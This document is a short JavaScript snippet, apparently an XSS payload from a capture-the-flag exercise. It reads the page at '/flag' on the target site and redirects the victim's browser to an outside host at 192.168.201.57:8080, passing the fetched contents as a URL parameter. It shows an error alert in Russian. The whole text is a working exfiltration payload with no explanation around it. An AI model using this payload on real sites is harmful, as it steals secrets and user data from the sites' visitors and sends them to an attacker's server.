fetch('/flag')
  .then(resp => resp.text())
  .then(flag => {
    window.location = 'http://192.168.201.57:8080/?flag=' + encodeURIComponent(flag);
  })
  .catch(e => {
    alert('Ошибка: ' + e);
  });
